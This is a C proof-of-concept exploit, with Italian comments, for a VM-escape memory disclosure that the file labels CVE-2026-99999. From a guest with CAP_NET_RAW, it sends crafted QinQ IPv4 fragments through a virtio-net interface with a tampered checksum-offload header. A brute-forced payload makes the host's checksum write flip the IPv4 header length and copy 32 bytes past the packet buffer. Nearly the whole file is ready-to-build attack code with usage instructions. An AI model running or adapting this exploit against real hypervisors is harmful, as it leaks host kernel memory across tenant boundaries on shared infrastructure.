// pwnescape_read.c — Guest-side memory disclosure PoC (CVE-2026-99999)
//
// Root cause: IPv4 non valida csum_start prima di skb_checksum_help();
// un CHECKSUM_PARTIAL driftato post-decapsulazione L2 fa scrivere il
// checksum completato SOPRA l'header IPv4 già validato (iph[0]: version/IHL),
// e ip_do_fragment() consuma l'IHL mutato (20 -> 60 byte) copiando 32 byte
// oltre la fine della linear head (skb_headlen) come "IP options".
//
// Ambiente: guest Linux con CAP_NET_RAW, iface = NIC virtio-net (Firecracker),
// kernel host PRE-fix (prima di 6785011f8b16).
// Build:   gcc -O2 -o pwnescape_read pwnescape_read.c
// Usage:   ./pwnescape_read <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/virtio_net.h>   /* struct virtio_net_hdr */
#include <netinet/in.h>

#ifndef IP_MF
#define IP_MF 0x2000
#endif

#ifndef PACKET_VNET_HDR
#define PACKET_VNET_HDR 15
#endif

/* IPv4 dopo la scrittura driftata: 0x4f = version 4, IHL 15 (60 byte) */
#define IHL_FLIP_HI 0x4f        /* high byte richiesto su iph[0] */

static uint16_t iph_checksum(const uint8_t *h, int len) {
    uint32_t s = 0;
    for (int i = 0; i < len; i += 2)
        s += (h[i] << 8) | h[i + 1];
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

static uint16_t fold16(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

/* Somma big-endian (16-bit granularity, come skb_checksum) */
static uint32_t be_sum(const uint8_t *p, int n) {
    uint32_t s = 0;
    for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i + 1];
    if (n & 1) s += p[n - 1] << 8;
    return s;
}

/* Trova x,y tali che il byte alto del checksum foldato == IHL_FLIP_HI.
 * skb_checksum_help scrive il __sum16 in network order:
 *   mem[0] = fold >> 8, mem[1] = fold & 0xff
 * quindi iph[0] = fold >> 8  =>  serve (fold & 0xff00) == IHL_FLIP_HI<<8.
 * 256 candidati liberi sul low byte => tuning sempre risolvibile. */
static int tune_payload(uint8_t *p1, uint32_t base_sum) {
    for (int x = 0; x < 256; x++)
        for (int y = 0; y < 256; y++) {
            uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + y);
            if ((f & 0xff00) == ((uint16_t)IHL_FLIP_HI << 8)) {
                p1[0] = (uint8_t)x; p1[1] = (uint8_t)y;
                return 0;
            }
        }
    return -1;
}

static int open_pkt_sock(const char *ifname) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }
    int one = 1;
    if (setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR, &one, sizeof(one)) < 0) {
        perror("PACKET_VNET_HDR (serve IFF_VNET_HDR sul tap dell'iface)");
        close(fd); return -1;
    }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = (int)if_nametoindex(ifname);
    if (!sll.sll_ifindex) { fprintf(stderr, "iface %s: %s\n", ifname, strerror(errno)); close(fd); return -1; }
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind"); close(fd); return -1;
    }
    return fd;
}

/* Frame QinQ: outer 802.1ad (4B) + inner 802.1Q (4B) + IP(20) + payload
 * Geometria (blog): csum_start punta sull'header IP del frame QinQ;
 * la decapsulazione VLAN lato host sposta network_header mentre
 * csum_start resta => drift. Con csum_offset=0 la scrittura della
 * skb_checksum_help() finisce su iph[0] (version/IHL). */
static void build_frag(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                       uint32_t saddr, uint32_t daddr, uint16_t id,
                       uint16_t frag_off_mf, const uint8_t *payload, int plen) {
    memset(f, 0, 14 + 8 + 20 + (size_t)plen);
    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
    f[12] = 0x88; f[13] = 0xa8;                       /* 802.1ad outer */
    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00; /* vid=10, inner 802.1Q */
    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00; /* vid=10, IPv4 */
    uint8_t *ip = f + 22;
    ip[0] = 0x45; ip[1] = 0x00;                       /* IHL=5 -> poi 0x4f via drift */
    *(uint16_t *)(ip + 2) = htons((uint16_t)(20 + plen));
    *(uint16_t *)(ip + 4) = htons(id);
    *(uint16_t *)(ip + 6) = htons(frag_off_mf);
    ip[8] = 64; ip[9] = IPPROTO_UDP;
    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
    memcpy(ip + 20, payload, plen);
    *(uint16_t *)(ip + 10) = iph_checksum(ip, 20);
}

/* TX via AF_PACKET con PACKET_VNET_HDR: OGNI send include un vnet header.
 * NB: i campi di virtio_net_hdr sono __u16 LITTLE-ENDIAN: assegnazione
 * diretta, NESSUN htons(). */
static int send_vnet(int fd, const uint8_t *frame, size_t flen,
                     uint16_t csum_start, uint16_t csum_offset, uint8_t flags) {
    static uint8_t buf[2048];
    const size_t hs = sizeof(struct virtio_net_hdr);   /* 10 */
    if (hs + flen > sizeof(buf)) return -1;
    struct virtio_net_hdr *vh = (struct virtio_net_hdr *)buf;
    memset(vh, 0, hs);
    vh->flags       = flags;
    vh->csum_start  = csum_start;      /* host byte order == LE */
    vh->csum_offset = csum_offset;
    memcpy(buf + hs, frame, flen);
    return (int)send(fd, buf, hs + flen, 0);
}

int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    uint32_t saddr = inet_addr(argc > 2 ? argv[2] : "10.0.0.5");
    uint32_t daddr = inet_addr(argc > 3 ? argv[3] : "10.0.0.9");
    uint16_t id    = argc > 4 ? (uint16_t)strtoul(argv[4], NULL, 0) : 0x1337;
    uint16_t csum_start = argc > 5 ? (uint16_t)atoi(argv[5]) : 22;
    uint16_t csum_off   = argc > 6 ? (uint16_t)atoi(argv[6]) : 0;

    /* payload2: riempie fino a superare l'MTU egresso => frammentazione */
    static uint8_t p2[1456];
    memset(p2, 0x41, sizeof(p2));
    uint8_t p1[8] = { 0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0xde, 0xad }; /* [0..1] tunabili */

    uint8_t f1[14 + 8 + 20 + 8];
    uint8_t f2[14 + 8 + 20 + sizeof(p2)];
    uint8_t dhost[6] = { 0x02,0x00,0x00,0x00,0x00,0x02 };  /* MAC gw/egress */
    uint8_t shost[6] = { 0x02,0x00,0x00,0x00,0x00,0x05 };  /* MAC guest    */

    build_frag(f1, dhost, shost, saddr, daddr, id, IP_MF, p1, 8);   /* MF=1, off=0 */
    build_frag(f2, dhost, shost, saddr, daddr, id, 1, p2, sizeof(p2)); /* MF=0, off=1 (8B) */

    /* base_sum = cio' che skb_checksum_help sommera' da csum_start a fine skb:
     *  - header IP (20B) COSI' COME TRASMESSO, campo check incluso (costante:
     *    non dipende dai payload, quindi resta valido dopo il tuning)
     *  - p1[2..7] (i byte [0..1] sono le variabili libere del tuning)
     *  - p2 per intero (la somma di skb_checksum arriva a skb->len, frags inclusi) */
    uint32_t base = be_sum(f1 + 22, 20)
                  + be_sum(p1 + 2, 6)
                  + be_sum(p2, sizeof(p2));

    if (tune_payload(p1, base) < 0) {
        fprintf(stderr, "tuning fallito\n");
        return 1;
    }
    /* rebuild di frag1 con il payload tunato (il check IP non cambia:
     * copre solo l'header) */
    build_frag(f1, dhost, shost, saddr, daddr, id, IP_MF, p1, 8);

    int fd = open_pkt_sock(ifname);
    if (fd < 0) return 1;

    /* frag2 prima (coda di reassembly), poi frag1 (testa, col vnet_hdr driftato) */
    if (send_vnet(fd, f2, sizeof(f2), 0, 0, 0) < 0) { perror("send frag2"); return 1; }
    usleep(2000);
    if (send_vnet(fd, f1, sizeof(f1), csum_start, csum_off,
                  VIRTIO_NET_HDR_F_NEEDS_CSUM) < 0) { perror("send frag1"); return 1; }

    printf("[+] frag id=0x%04x inviati: frag2 (%zu B, off=1) + frag1 driftato "
           "(csum_start=%u, csum_offset=%u, NEEDS_CSUM)\n"
            "    atteso lato osservazione egress: 0x45.. -> 0x4f.. su iph[0], "
            "32 B di 'IP options' oltre la linear head\n",
            id, sizeof(f2), csum_start, csum_off);
    close(fd);
    return 0;
}
